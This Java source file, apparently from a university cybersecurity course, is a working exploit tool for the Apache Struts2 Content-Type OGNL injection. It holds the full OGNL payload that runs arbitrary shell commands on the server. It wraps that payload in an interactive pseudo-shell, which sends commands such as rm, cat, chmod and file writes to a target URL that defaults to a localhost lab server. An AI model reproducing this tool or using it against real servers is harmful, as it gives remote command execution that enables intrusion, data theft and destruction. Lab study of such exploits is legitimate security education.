package edu.uvu.ms.cybersecurity;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class Send {
    private String path;
    private String url;

    public static String BK = "..";
    public static String SH = ".sh";
    public static String RM = "rm";
    public static String LS = "ls";
    public static String PWD = "pwd";
    public static String CAT = "cat";
    public static String ECHO = "echo";
    public static String CHMOD = "chmod";
    public static String MKDIR = "mkdir";
    public static String CD = "cd";
    public static String JOIN = " && ";
    public static String DEF_URL = "http://localhost:8080/MSCybersecurity/exploit";
    public static String CONTENT_TYPE = "Content-Type";
    public static String EXPLOIT = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='*?')" +
            ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";

    public static void main(String[] args) {
        try {
            new Send().begin();
        } catch (Exception e) {
            System.out.println("Initialization failed due to " + e);
        }
    }

    private void begin() throws IOException {
        banner();
        setURL();
        setPath();
        System.out.println("Using URL: " + url);
        while (true) {
            try {

                String cmd = getInput();
                cmd = parse(cmd);
                if (cmd != null) {
                    String fmt = EXPLOIT.replace("*?", cmd);
                    String rsp = send(url, fmt);
                    print(cmd, rsp);
                }
            } catch (Exception e) {
                System.out.println("Command failed due to " + e);
            }

        }
    }

    private void setPath() throws IOException {
        String pth = send(this.url, EXPLOIT.replace("*?", "pwd"));
        this.path = pth.contains("\n") ? pth.split("\n")[0] : pth;
    }

    private String parse(String input) throws IOException {
        input = input.trim();
        boolean isCD = check(input,2,CD);
        boolean isPWD = check(input,3,PWD);
        boolean isMKDIR = check(input,5,MKDIR);
        boolean isECHO = check(input,4,ECHO);
        boolean isCHMOD = check(input,5,CHMOD);
        boolean isRM = check(input,2,RM);
        boolean isLS = check(input,2,LS);
        boolean isCAT = check(input,3,CAT);
        if (input.contains("reset")) {
            setPath();
            return null;
        }
        if (isCD) {
            String[] args = input.split("\\s");
            for (int i = 1; i < args.length; i++) {
                String obj = args[i];
                if (obj.contains(BK)) {
                    int index = path.lastIndexOf("/");
                    path = path.substring(0, index);
                    return null;
                }
            }

            if (input.contains("/")) {
                path = input.replaceAll(CD, "");
            } else {
                if (!(args.length < 2)) {
                    path = path + "/" + args[1];
                }
                return null;
            }
        }

        if (isPWD) {
            System.out.println(path);
            return null;
        }

        if (isMKDIR || isRM) {
            String[] args = input.split("\\s");
            if (args.length < 2) {
                return null;
            }
            String tmp = "";
            for (int i = 0; i < args.length - 1; i++) {
                tmp += args[i] + " ";
            }
            input = tmp + " " + path + "/" + args[args.length - 1];
            return input;

        }

        if (isCAT) {
            String args[] = input.split("\\s");
            if(args.length<2){
                return null;
            }
            if(input.endsWith("/")){
                input = args[0]+" "+path+args[1];
            }else{
                input = args[0]+" "+path+"/"+args[1];
            }

            return input;

        }

        if (isECHO){
            String args[] = input.split("\\s");
            if(args.length<2){
                return null;
            }
            if(args.length<3){
                return input;
            }

            if(input.contains(">")){
                args= input.split(">");

                if(args[1].contains("/")){
                    input = args[0]+" "+">"+" "+args[1];
                }else{
                    if(path.endsWith("/")){
                        input = args[0]+" "+">"+" "+path+args[1];
                    }else{
                        input = args[0]+" "+">"+" "+path+"/"+args[1].trim();
                    }

                }
            }

            return input;
        }

        if(isCHMOD){
            String args[] = input.split("\\s");
            if(args.length < 3){
                return null;
            }else{
                if(path.endsWith("/")){
                    input = args[0]+" "+args[1]+" "+path+args[2];
                }else{
                    input = args[0]+" "+args[1]+" "+path+"/"+args[2];
                }

            }

            return input;

        }

        if(input.endsWith(SH)){

            if(path.endsWith("/")){
                input = path+input;
            }else{
                input = path+"/"+input;
            }

            return input;
        }

        if (input.contains("/")) {
            Object[] args = input.split("\n");
            return input;
        }

        if(isLS){
            input = input + " " + path;
            return input;
        }
       return input;
    }

    private boolean check(String input, int len, String type){
        if (input.length() < len) {
            return false;
        }
        if (input.substring(0, len).equals(type)) {
            return true;
        }

        return false;
    }


    public void setURL() {
        String loc = getInput("url");
        if (loc == null || loc.equals("")) {
            loc = DEF_URL;
        }
        this.url = loc;
    }

    public static String getInput(String msg) {
        System.out.print(String.format("Enter %s: ", msg));
        Scanner sc = new Scanner(System.in);
        String message = sc.nextLine();
        return message;
    }

    public String getInput() {
        System.out.print(String.format("%s: ", path));
        Scanner sc = new Scanner(System.in);
        String message = sc.nextLine();
        return message;
    }

    private String send(String loc, String exp) throws IOException {
        URL url = new URL(loc);
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty(CONTENT_TYPE, exp);
        con.setDoOutput(true);
        Integer status = con.getResponseCode();
        StringBuffer resp = new StringBuffer();
        if (status.equals(200)) {
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String output_line;
            while ((output_line = in.readLine()) != null) {
                resp.append(output_line + "\n");
            }
            in.close();

            // Struts 2.5 is executing the payload twice, and is returning values twice (so filter them out)
            String  value = resp.toString();
            int mid = value.length() /2;
            return value.substring(0,mid);

        }

        System.out.println("failed to send command...");
        return null;
    }

    private void print(String cmd, String rsp) {
        if (rsp != null && !rsp.equals("")) {
            System.out.println("----------RESPONSE----------");
            System.out.println("URL: " + this.url);
            System.out.println("CMD: " + cmd + "\n");
            System.out.println(rsp);
            System.out.println("----------------------------");
        }
    }

    private static void banner() {
        System.out.println("********************************************");
        System.out.println("* Send commands to vulnerable Struts2 apps *");
        System.out.println("********************************************");
    }
}
